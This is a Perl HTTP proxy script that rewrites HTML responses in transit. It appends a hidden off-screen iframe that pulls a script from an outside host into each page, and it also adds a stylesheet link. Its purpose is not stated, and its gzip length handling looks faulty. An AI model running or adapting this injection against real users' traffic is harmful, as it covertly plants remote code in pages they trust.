#!/usr/local/bin/perl

use HTTP::Proxy qw(:log);
use HTTP::Proxy::BodyFilter::simple;
use HTTP::Proxy::BodyFilter::complete;
use HTTP::Proxy::HeaderFilter::simple;
use Compress::Zlib;
use Data::Dumper;

my $contentEncoding;
my $hostname = 'ps48174.dreamhostps.com:8081';

my $INSERT = <<END;
<script>
(function(d) {
    var iframe = d.body.appendChild(d.createElement('iframe')), doc = iframe.contentWindow.document;
        iframe.src = 'about:blank';
        iframe.style.cssText = "position:absolute;width:1px;height:1px;left:-9999px;";
    doc.open().write('<body onload="YUI_config={win:window.parent,doc:window.parent.document};var d=document;d.getElementsByTagName(\\'head\\')[0].appendChild(d.createElement(\\'script\\')).src=\\'http://ps48174.dreamhostps.com:8081/together\\';"><script src="http://yui.yahooapis.com/combo?3.3.0/build/yui/yui-min.js&3.3.0/build/loader/loader-min.js"><\\/script><\\/body>');
    doc.close();
})(document);
</script>
END

my $css = '<link rel="stylesheet" href="http://' . $hostname . '/footer.css" type="text/css" />';

my $gzip = Compress::Zlib::memGzip($INSERT);
my $gzip_css = Compress::Zlib::memGzip($css);
# init
my $proxy = HTTP::Proxy->new( port => 8080, host => '', max_clients => 100 );
$proxy->push_filter(
    mime     => 'text/html',
    response => HTTP::Proxy::BodyFilter::complete->new,
    response => HTTP::Proxy::BodyFilter::simple->new(
        sub {
            my ( $self, $dataref, $message, $protocol, $buffer ) = @_;
            if ($$dataref) {
                if ($contentEncoding eq 'gzip') {
                    $dest = Compress::Zlib::memGunzip($$dataref) or die "Cannot uncompress: $gzerrno\n";
                    $dest =~ s!</head>!$css</head>!i; 
                    $$dataref = $dest . $INSERT;
                    $$dataref = Compress::Zlib::memGzip($$dataref) or die "Cannot uncompress: $gzerrno\n";
                } else {
                    ${ $_[1] } =~ s!</head>!$css</head>!i;
                    ${ $_[1] } =~ s#$#$INSERT#i;
                }
            }
        }
    )
);

my $filter = HTTP::Proxy::HeaderFilter::simple->new(
    sub { 
            if ($_[1]->header('content-type') =~ m#text/html#i &&  $_[1]->header('content-encoding') =~ /gzip/) {
                $_[1]->header('content-length', $_[1]->header('content-length') + length($gzip) + length($gzip_css));
                $contentEncoding = 'gzip';
            } else {
                $contentEncoding = '';
            }
    }
);
$proxy->push_filter( response => $filter );

print "Ready to rumble on " . $proxy->host . ':' . $proxy->port . "\n";
$proxy->start;
